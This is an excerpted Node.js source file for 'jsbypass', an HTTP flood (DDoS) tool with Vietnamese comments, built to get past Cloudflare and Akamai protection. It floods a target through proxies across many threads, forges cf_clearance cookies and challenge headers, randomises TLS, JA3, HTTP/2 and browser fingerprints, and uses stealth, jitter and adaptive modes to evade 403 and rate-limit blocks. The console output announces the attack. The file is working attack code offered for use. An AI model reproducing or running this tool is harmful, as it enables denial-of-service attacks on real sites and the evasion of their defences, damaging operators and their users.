/* 
 jsbypass - Nodejs Bypass HTTP-DDoS Cloudflare/Akamai (Nâng cấp)
 Update: 07-08-2026
...
// Mở rộng danh sách bỏ qua lỗi
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'ECONNRESET', 'EPIPE', 'ETIMEDOUT'];
...
// ===== THÊM TÍNH NĂNG MỚI CHỐNG 403 =====
// 1. Chế độ "Stealth Mode" - Làm chậm và ngẫu nhiên hóa
const stealthMode = process.argv.includes('--stealth');

// 2. Chế độ "Jitter" - Biến động thời gian request
const jitterMode = process.argv.includes('--jitter');

// 3. Tự động xoay User-Agent theo thời gian thực
const rotateUA = process.argv.includes('--rotate-ua');

// 4. Chế độ "Slow Start" - Tăng dần tốc độ
const slowStart = process.argv.includes('--slow-start');

// 5. Random Path Rotation mạnh hơn
const deepRandPath = process.argv.includes('--deep-rand');

// 6. Chế độ "Respect Rate Limit" - Tôn trọng rate limit của server
const respectRateLimit = process.argv.includes('--respect-rate');

// 7. Chế độ "Adaptive" - Tự động điều chỉnh dựa trên phản hồi
const adaptiveMode = process.argv.includes('--adaptive');
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    ...
    console.log(`
     ...
     ${chalk.magenta('JSBYPASS')} - ${chalk.magenta('Update')}: 07/08/2026 - Version: ${chalk.white.bold('2.0')}
     ...
     ${chalk.red('Example:')}
        node ${process.argv} GET https://target.com/ 120 16 90 proxy.txt --debug --adaptive --jitter --stealth --slow-start --rotate-ua --respect-rate 
     ${chalk.yellow('Options:')}
      ...
      ${chalk.cyan('== CHỐNG 403 NÂNG CAO ==')}
      --stealth - Chế độ tàng hình (giảm tốc, ngẫu nhiên hóa)
      --jitter - Thêm biến động thời gian request (±30%)
      --rotate-ua - Xoay User-Agent liên tục
      --slow-start - Tăng dần tốc độ từ từ
      --deep-rand - Random path sâu hơn
      --respect-rate - Tôn trọng rate limit của server
      --adaptive - Tự động điều chỉnh dựa trên phản hồi
...
setInterval(() => {
    randomPathSuffix = deepRandPath 
        ? `${getRandomChar()}${getRandomChar()}${getRandomChar()}_${randstr(4)}`
        : `${getRandomChar()}`;
...
if (cookieValue) {
    if (cookieValue === '%RAND%') {
        ...
        while (finalCookie.includes('%RAND%')) {
            finalCookie = finalCookie.replace('%RAND%', randstr(8));
        }
        hcookie = hcookie ? `${hcookie}; ${finalCookie}` : finalCookie;
    }
}
...
// ===== CẢI TIẾN: TẠO COOKIE ĐA DẠNG HƠN =====
function generateCfClearanceCookie(fingerprint) {
    const timestamp = Math.floor(Date.now() / 1000) + getRandomInt(-60, 60);
    ...
    const hashPart = crypto
        .createHash('sha256')
        .update(`${clientId}${timestamp}${fingerprint.ja3}${Math.random()}`)
        .digest('hex')
        .substring(0, 16);
...
function generateChallengeHeaders(fingerprint) {
    ...
    const challengeResponse = crypto
        .createHash('md5')
        .update(`${challengeToken}${fingerprint.canvas}${timestamp}${Math.random()}`)
        .digest('hex');
...
function generateAuthorizationHeader(authValue) {
    ...
    if (type.toLowerCase() === 'bearer') {
        ...
        while (finalValue.includes('%RAND%')) {
            finalValue = finalValue.replace('%RAND%', randstr(16));
        }
        return `Bearer ${finalValue}`;
...
function generateHTTP2Fingerprint() {
    const settings = {
        HEADER_TABLE_SIZE: [4096, 16384, 8192, 32768],
        ENABLE_PUSH: [0, 1],
        MAX_CONCURRENT_STREAMS: [50, 100, 150, 200],
        INITIAL_WINDOW_SIZE: [65535, 262144, 524288],
        MAX_FRAME_SIZE: [16384, 65536, 131072],
        MAX_HEADER_LIST_SIZE: [8192, 32768, 65536],
...
function generateBrowserFingerprint(browserType, ja3Fingerprint) {
    ...
    let rdversion = getRandomInt(120, 133);
    ...
    const chromeDesktopUAs = [
        ...
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.${getRandomInt(0, 100)}.${getRandomInt(0, 50)} Safari/537.36`,
    ...
    const canvasSeed = crypto.createHash('md5').update(userAgent + 'canvas_seed' + Math.random()).digest('hex');
    const canvasFingerprint = canvasSeed.substring(0, 8);
    const webglFingerprint = crypto.createHash('md5').update(selectedWebGL.vendor + selectedWebGL.renderer + Math.random()).digest('hex').substring(0, 8);
    ...
    const generateJA3 = () => {
        ...
        return crypto.createHash('md5').update(ja3 + Math.random()).digest('hex');
    };
    ...
    return {
        ...
        plugins: [
            ...
            Math.random() > 0.3 ? { name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format" } : null,
...
function calculateAdaptiveDelay() {
    if (!adaptiveMode) return 0;
    
    const baseDelay = 0;
    let extraDelay = 0;
    
    // Tăng delay khi có nhiều 403
    if (adaptState.consecutive403 > 5) {
        extraDelay += Math.min(adaptState.consecutive403 * 10, 500);
    }
    
    // Giảm delay khi thành công
    if (adaptState.successRate > 0.9) {
        extraDelay = Math.max(0, extraDelay - 50);
    }
    
    // Backoff
    if (adaptState.backoffLevel > 0) {
        extraDelay += adaptState.backoffLevel * 100;
    }
...
function go() {
    ...
    const netSocket = net.connect({
        ...
        netSocket.once('data', () => {
            ...
            tlsSocket = tls.connect({
                ...
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    ...
                    function mainH1() {
                        // Xoay UA nếu bật
                        let currentUA = fingerprint.navigator.userAgent;
                        if (rotateUA) {
                            const newFingerprint = generateBrowserFingerprint(
                                ['chrome', 'firefox', 'edge'][Math.floor(Math.random() * 3)],
                                ja3Fingerprint
                            );
                            currentUA = newFingerprint.navigator.userAgent;
                        }
                        ...
                        if (jitterMode) {
                            currentDelay += getRandomInt(-Math.floor(delay * 0.3), Math.floor(delay * 0.3));
                            currentDelay = Math.max(0, currentDelay);
                        }
                        
                        // Slow Start
                        if (slowStart) {
                            const progress = Math.min(1, (Date.now() - timestamp) / (time * 1000 * 0.3));
                            currentDelay = Math.floor(delay * (1 + (1 - progress) * 2));
                        }
                        ...
                        tlsSocket.write(h1payl, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    if (!isClosed) mainH1();
                                }, isFull ? 300 : Math.max(50, (300 / ratelimit) + currentDelay));
                            } else {
                                tlsSocket.end(() => { tlsSocket.destroy(); isClosed = true; });
                            }
                        });
                    }
                    ...
                    while (data.length >= 9) {
                        ...
                        if (frame != null) {
                            ...
                            if (frame.type == 1) {
                                ...
                                // Adaptive: cập nhật trạng thái
                                if (adaptiveMode) {
                                    adaptState.lastStatus = parseInt(status);
                                    if (status == 403 || status == 429) {
                                        adaptState.consecutive403++;
                                        adaptState.backoffLevel = Math.min(adaptState.backoffLevel + 1, 10);
                                    } else {
                                        adaptState.consecutive403 = Math.max(0, adaptState.consecutive403 - 1);
                                        if (status >= 200 && status < 300) {
                                            adaptState.successRate = adaptState.successRate * 0.9 + 0.1;
                                            adaptState.backoffLevel = Math.max(0, adaptState.backoffLevel - 1);
                                        }
                                    }
                                }
                ...
                // ===== HÀM GỬI REQUEST CHÍNH =====
                function sendRequests() {
                    if (tlsSocket.destroyed || isClosed) {
                        return;
                    }
                    ...
                    // Adaptive rate limit
                    let currentRate = ratelimit;
                    if (adaptiveMode) {
                        if (adaptState.consecutive403 > 3) {
                            currentRate = Math.max(5, Math.floor(ratelimit * 0.5));
                        } else if (adaptState.successRate > 0.8) {
                            currentRate = Math.min(ratelimit * 2, 200);
                        }
                    }
                    ...
                    if (slowStart) {
                        const progress = Math.min(1, (Date.now() - timestamp) / (time * 1000 * 0.3));
                        localRatelimit = Math.max(5, Math.floor(localRatelimit * progress));
                    }
                    
                    // Stealth Mode: giảm tốc
                    if (stealthMode) {
                        localRatelimit = Math.floor(localRatelimit * 0.6);
                    }
                    
                    // Parse custom headers một lần duy nhất
                    ...
                    for (let i = 0; i < (isFull ? batchSize : 1); i++) {
                        ...
                        const regularHeaders = generateDynamicHeaders(currentFingerprint).filter(a => a[1] != null);
                        ...
                        // Tạo cookie và challenge headers
                        const cookieHeader = generateCfClearanceCookie(currentFingerprint);
                        const challengeHeaders = generateChallengeHeaders(currentFingerprint);
                        
                        // Kết hợp tất cả headers
                        let combinedHeaders = [
                            ...pseudoHeaders,
                            ...allRegularHeaders,
                            ['cookie', cookieHeader],
                        ...
                        customHeadersArray.forEach(header => {
                            ...
                            entries.forEach(([key, value]) => {
                                combinedHeaders.push([key, value]);
                            });
                        });
                    ...
                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        ...
                        let finalDelay = isFull ? 300 : (300 / localRatelimit);
                        
                        if (jitterMode) {
                            const jitter = getRandomInt(-Math.floor(finalDelay * 0.3), Math.floor(finalDelay * 0.3));
                            finalDelay = Math.max(50, finalDelay + jitter);
                        }
                        
                        if (stealthMode) {
                            finalDelay += getRandomInt(50, 200);
                        }
                        
                        // Respect rate limit
                        if (respectRateLimit && adaptState.consecutive403 > 2) {
                            finalDelay = Math.max(finalDelay, 500);
                        }
                        
                        // Thêm adaptive delay
                        finalDelay += calculateAdaptiveDelay();
                        
                        setTimeout(() => {
                            if (!isClosed) sendRequests();
                        }, finalDelay);
                    });
                }

                // Gọi hàm sendRequests lần đầu
                if (stealthMode) {
                    // Stealth mode: thêm delay ngẫu nhiên trước khi gửi
                    const stealthDelay = getRandomInt(50, 500);
                    setTimeout(() => {
                        if (!isClosed) sendRequests();
                    }, stealthDelay);
                } else {
        ...
        if (!isClosed) {
            ...
            setTimeout(go, getRandomInt(100, 500));
        }
    });
...
if (cluster.isMaster) {
    ...
    console.log(chalk.green.bold(`[+] Attack Launched @bixd08`));
    console.log(chalk.cyan(`[+] Target: ${target}`));
    console.log(chalk.cyan(`[+] Time: ${time}s`));
    console.log(chalk.cyan(`[+] Threads: ${threads}`));
    console.log(chalk.cyan(`[+] Proxies: ${proxy.length}`));
    if (stealthMode) console.log(chalk.yellow(`[+] Stealth Mode: ENABLED`));
    if (jitterMode) console.log(chalk.yellow(`[+] Jitter Mode: ENABLED`));
    if (adaptiveMode) console.log(chalk.yellow(`[+] Adaptive Mode: ENABLED`));
    console.log(chalk.green.bold(`[+] Status: ATTACKING...`));
    ...
    if (debugMode) {
        setInterval(() => {
            ...
            // Hiển thị thông tin adaptive nếu bật
            let adaptInfo = '';
            if (adaptiveMode) {
                adaptInfo = ` | Adapt: ${chalk.blue(`Rate=${Math.round(adaptState.successRate*100)}%`)} ${chalk.yellow(`403=${adaptState.consecutive403}`)}`;
            }
            const statusString = Object.entries(statuses)
                .map(([status, count]) => colorizeStatus(status, count))
                .join(', ');
            console.log(`(${chalk.magenta.bold('JSBYPASS')}) | Date: (${chalk.blue.bold(new Date().toLocaleString('en-US'))}) | Time: (${time}s) | Status: (${statusString}) | Connections: (${chalk.cyan.bold(totalConnections)})${adaptInfo}`);
            proxyConnections = 0;
        }, 1000);
    }
